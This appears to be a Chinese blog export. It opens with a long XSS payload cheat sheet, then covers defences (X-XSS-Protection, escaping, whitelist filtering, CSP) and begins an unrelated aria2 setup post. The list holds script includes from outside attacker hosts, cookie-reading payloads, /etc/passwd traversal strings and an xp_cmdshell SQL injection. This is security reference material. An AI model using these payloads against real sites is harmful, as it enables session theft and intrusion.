<h2 id="XSS-跨站脚本攻击-常用代码大全"><a href="#XSS-跨站脚本攻击-常用代码大全" class="headerlink" title="XSS(跨站脚本攻击) - 常用代码大全"></a>XSS(跨站脚本攻击) - 常用代码大全</h2><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;prompt(915149)&lt;/ScRiPt&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;svg/onload=alert(1)&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line">&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">=<span class="string">&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">%3Cscript%3Ealert(&#x27;</span>XSS<span class="string">&#x27;)%3C/script%3E</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;script&gt;alert(&#x27;</span>XSS<span class="string">&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;img src=&quot;javascript:alert(&#x27;</span>XSS<span class="string">&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;script&gt;alert(&#x27;</span>Vulnerable<span class="string">&#x27;);&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;script&gt;alert(&#x27;</span>Vulnerable<span class="string">&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">a.jsp/&lt;script&gt;alert(&#x27;</span>Vulnerable<span class="string">&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">a?&lt;script&gt;alert(&#x27;</span>Vulnerable<span class="string">&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;</span>Vulnerable<span class="string">&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#x27;</span>;exec%20master..xp_cmdshell%<span class="number">20</span><span class="string">&#x27;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&#x27;</span>--&amp;&amp;</span><br><span class="line"> </span><br><span class="line">%<span class="number">22</span>%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line"> </span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line"> </span><br><span class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=javascript:alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=JaVaScRiPt:alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=JaVaScRiPt:alert(<span class="string">&quot;XSS&quot;</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=javascript:alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=javascript:alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=javascript:alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&lt;IMG src=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;</span>;<span class="string">&#x27; &gt; out</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;IMG src=&quot; javascript:alert(&#x27;</span>XSS<span class="string">&#x27;);&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;BODY BACKGROUND=&quot;javascript:alert(&#x27;</span>XSS<span class="string">&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;BODY ONLOAD=alert(&#x27;</span>XSS<span class="string">&#x27;)&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;IMG DYNSRC=&quot;javascript:alert(&#x27;</span>XSS<span class="string">&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;IMG LOWSRC=&quot;javascript:alert(&#x27;</span>XSS<span class="string">&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;BGSOUND src=&quot;javascript:alert(&#x27;</span>XSS<span class="string">&#x27;);&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;br size=&quot;&amp;&#123;alert(&#x27;</span>XSS<span class="string">&#x27;)&#125;&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript:alert(&#x27;</span>XSS<span class="string">&#x27;);&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;IMG src=&#x27;</span>vbscript:msgbox(<span class="string">&quot;XSS&quot;</span>)<span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;IMG src=&quot;mocha:[code]&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;IMG src=&quot;livescript:[code]&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#x27;</span>XSS<span class="string">&#x27;);&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;IFRAME src=javascript:alert(&#x27;</span>XSS<span class="string">&#x27;)&gt;&lt;/IFRAME&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(&#x27;</span>XSS<span class="string">&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;TABLE BACKGROUND=&quot;javascript:alert(&#x27;</span>XSS<span class="string">&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#x27;</span>XSS<span class="string">&#x27;))&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;DIV STYLE=&quot;behaviour: url(&#x27;</span>http:<span class="comment">//www.how-to-hack.org/exploit.html&#x27;);&quot;&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;DIV STYLE=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;&lt;/STYLE&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG STYLE=<span class="string">&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;</span><br><span class="line"> </span><br><span class="line">&lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</span><br><span class="line"> </span><br><span class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line"> </span><br><span class="line">&lt;BASE href=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);//&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">getURL(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">a=<span class="string">&quot;get&quot;</span>;b=<span class="string">&quot;URL&quot;</span>;c=<span class="string">&quot;javascript:&quot;</span>;d=<span class="string">&quot;alert(&#x27;XSS&#x27;);&quot;</span>;eval(a+b+c+d);</span><br><span class="line"> </span><br><span class="line">&lt;XML src=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&gt; &lt;BODY&gt;&lt;SCRIPT&gt;function a()&#123;alert(&#x27;XSS&#x27;);&#125;&lt;/SCRIPT&gt;&lt;&quot;</span></span><br><span class="line"> </span><br><span class="line">&lt;SCRIPT src=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span></span><br><span class="line"> </span><br><span class="line">&lt;!--#exec cmd=&quot;/bin/echo &#x27;&lt;SCRIPT SRC&#x27;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo</span><br><span class="line"><span class="string">&#x27;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&#x27;</span><span class="string">&quot;--&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;IMG src=&quot;</span>http:<span class="comment">//www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> </span><br><span class="line">&lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> </span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; &#x27;&#x27; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> </span><br><span class="line">&lt;SCRIPT &quot;a=&#x27;&gt;&#x27;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> </span><br><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> </span><br><span class="line">&lt;A href=http:<span class="comment">//www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG SRC=# onmouseover=”alert(‘xxs’)”&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG SRC=/ onerror=”alert(String.fromCharCode(88,83,83))”&gt;&lt;/img&gt;</span><br><span class="line"> </span><br><span class="line">&lt;img src=x onerror=”&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041″&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;</span><br><span class="line"> </span><br><span class="line">&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG SRC=”jav&amp;#x0A;ascript:alert(‘XSS’);”&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG SRC=” &amp;#14;  javascript:alert(‘XSS’);”&gt;</span><br><span class="line"> </span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);<span class="comment">//&lt;&lt;/SCRIPT&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;IMG SRC=”javascript:alert(‘XSS’)”</span><br><span class="line"> </span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert(‘XSS’);&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”&gt;</span><br><span class="line"> </span><br><span class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"> </span><br><span class="line">&lt;svg/onload=alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;</span><br><span class="line"> </span><br><span class="line">&lt;BGSOUND SRC=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;BR SIZE=<span class="string">&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;LINK REL=<span class="string">&quot;stylesheet&quot;</span> HREF=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;&lt;/STYLE&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG STYLE=<span class="string">&quot;xss:expr/*XSS*/ession(alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="line"> </span><br><span class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line"> </span><br><span class="line">&lt;XSS STYLE=<span class="string">&quot;behavior: url(xss.htc);&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IFRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/IFRAME&gt;</span><br><span class="line"> </span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/FRAMESET&gt;</span><br><span class="line"> </span><br><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;DIV STYLE=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;svg onload=alert(document.domain)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;img src=document.domain onerror=alert(document.domain)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;M onmouseover=alert(document.domain)&gt;M</span><br><span class="line"> </span><br><span class="line">&lt;marquee onscroll=alert(document.domain)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a href=javascript:alert(document.domain)&gt;M&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;body onload=alert(document.domain)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;details open ontoggle=alert(document.domain)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;embed src=javascript:alert(document.domain)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;</span><br><span class="line"> </span><br><span class="line">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span><br><span class="line"> </span><br><span class="line">&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;</span><br><span class="line"> </span><br><span class="line">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</span><br><span class="line"> </span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;iMg src=<span class="number">1</span> oNeRrOr=alert(<span class="number">1</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;ImG src=<span class="number">1</span> OnErRoR=alert(<span class="number">1</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;alert(&amp;quot;M&amp;quot;)&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;marquee onscroll=alert(<span class="number">1</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;mArQuEe OnScRoLl=alert(<span class="number">1</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;MaRqUeE oNsCrOlL=alert(<span class="number">1</span>)&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a href=javascript:/0/,alert(%22M%22)&gt;M&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a href=javascript:/00/,alert(%22M%22)&gt;M&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a href=javascript:/000/,alert(%22M%22)&gt;M&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a href=javascript:/M/,alert(%22M%22)&gt;M&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;base href=javascript:/M/&gt;&lt;a href=,alert(1)&gt;M&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;base href=javascript:/M/&gt;&lt;iframe src=,alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/textarea&gt;&lt;script&gt;var a=1//@ sourceMappingURL=//xss.site&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&gt;&lt;img src=x onerror=alert(document.cookie)&gt;.gif</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;div style=&quot;</span>background-image:url(javascript:alert(/xss/))<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;STYLE&gt;@import&#x27;http://ha.ckers.org/xss.css&#x27;;&lt;/STYLE&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line">&lt;iframe src=&quot;data:text/html,&lt;iframe src=javascript:alert(&#x27;M&#x27;)&gt;&lt;/iframe&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"> </span><br><span class="line">&lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&gt;&lt;/iframe&gt;</span><br><span class="line"> </span><br><span class="line">&lt;iframe srcdoc=&lt;svg/o&amp;#x6E;load&amp;equals;alert&amp;lpar;1)&amp;gt;&gt;&lt;/iframe&gt;</span><br><span class="line"> </span><br><span class="line">&lt;iframe src=https:<span class="comment">//baidu.com width=1366 height=768&gt;&lt;/iframe&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;iframe src=javascript:alert(1) width=1366 height=768&gt;&lt;/iframe</span><br><span class="line"> </span><br><span class="line">&lt;form action=javascript:alert(<span class="number">1</span>)&gt;&lt;input type=submit&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form&gt;&lt;button formaction=javascript:alert(<span class="number">1</span>)&gt;M</span><br><span class="line"> </span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(<span class="number">1</span>) type=submit value=M&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(<span class="number">1</span>) type=image value=M&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(<span class="number">1</span>) type=image src=<span class="number">1</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;META HTTP-EQUIV=<span class="string">&quot;Link&quot;</span> Content=<span class="string">&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="浏览器自带防御"><a href="#浏览器自带防御" class="headerlink" title="浏览器自带防御"></a>浏览器自带防御</h2><p><code>HTTP X-XSS-Protection</code> 响应头是 IE,Chrome 和 Safari 的一个功能，当检测到 XSS 时，浏览器将停止加载页面。</p>
<p>可设置四个值：</p>
<ul>
<li><code>0</code> : 禁用 XSS 过滤。</li>
<li><code>1</code> : 启用 XSS 过滤(通常浏览器默认开启)，检测到 XSS 将删除页面(删除不安全的部分)。</li>
<li><code>1; mode=block</code> : 启用 XSS 过滤，检测到攻击，浏览器不会删除页面，而是阻止页面加载。</li>
<li><code>1; report=&lt;reporting-uri&gt;</code> : 启用 XSS 防御，检测到 XSS ，浏览器将清除页面并使用 <code>CSP report-uri</code> 指令的功能发送违规报告。</li>
</ul>
<p>浏览器自带的防御功能只能对反射型 XSS 有一定防御能力，其原理是检查 URL 和 DOM 中元素的相关性，并不能完全防御反射型 XSS 且不是所有浏览器都支持。</p>
<h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><p>在 XSS 攻击中，攻击者主要通过构造特殊字符来注入脚本，所以对输入进行检测是很有必要的，且需要在客户端与服务端都进行输入检测，然后对用户输入的数据进行转义。主要对输入所包含的特殊字符(<code>&lt; , &gt; , &amp; , &quot; , &#39;</code> 等) 进行转义来防止 XSS 攻击。</p>
<p>以下为一种转义方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHTML</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    str = str.replace(/&amp;/g, <span class="string">&quot;&amp;amp;&quot;</span>);</span><br><span class="line">    str = str.replace(/&lt;/g, <span class="string">&quot;&amp;lt;&quot;</span>);</span><br><span class="line">    str = str.replace(/&gt;/g, <span class="string">&quot;&amp;gt;&quot;</span>);</span><br><span class="line">    str = str.replace(/<span class="string">&quot;/g, &quot;</span>&amp;quot;<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    str = str.replace(/&#x27;/g, &quot;</span>&amp;<span class="comment">#39;&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><p>当一些页面需要保留 HTML 时，就不能通过转义的方法防御 XSS 攻击，这时可使用过滤的方式防御 XSS 攻击，就是通过使用白名单允许的 HTML 标记及其属性来防御攻击。</p>
<h2 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" title="内容安全策略(CSP)"></a>内容安全策略(CSP)</h2><p>内容安全策略（Content Security Policy，CSP），实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，大大增强了网页的安全性。</p>
<p>通过 HTTP 头信息的 Content-Security-Policy 字段启用 CSP</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;self&#x27;</span>; </span><br><span class="line">                         object-src <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">                         style-src cdn.example.org third-party.org; </span><br><span class="line">                         child-src https:</span><br></pre></td></tr></table></figure>
<p>通过网页 <code>&lt;meta&gt;</code> 标签启用 CSP</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，CSP 做了如下配置。</p>
<ul>
<li>脚本： 只信任当前域名。</li>
<li><code>&lt;object&gt;</code> 标签： 不信任任何 URL，即不加载任何资源。</li>
<li>样式表： 只信任 <code>cdn.example.org</code> 和 <code>third-party.org</code> 。</li>
<li>页面子内容: 如 <code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>： 必须使用HTTPS协议加载。</li>
<li>其他资源： 没有限制。</li>
</ul>
<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>aria2配置使用</title>
    <url>/posts/a28e5353/</url>
    <content><![CDATA[<h1 id="安装aria2"><a href="#安装aria2" class="headerlink" title="安装aria2"></a>安装aria2</h1><p><a href="https://github.com/aria2/aria2">aria2</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S aria2</span><br></pre></td></tr></table></figure>
<h2 id="配置aria2与开启RPC"><a href="#配置aria2与开启RPC" class="headerlink" title="配置aria2与开启RPC"></a>配置aria2与开启RPC</h2><p>RPC即远程过程调用，<a href="https://zhuanlan.zhihu.com/p/36427583">详解</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir ~/.config/aria2/</span><br><span class="line">touch ~/.config/aria2/aria2.session 	<span class="comment">#创建日志文件</span></span><br><span class="line">vim ~/.config/aria2/aria2.conf</span><br><span class="line"><span class="comment"># 加入以下配置内容，注意日志文件路径需要全路径</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p><strong>其他系统可相应更改路径即可</strong></p>
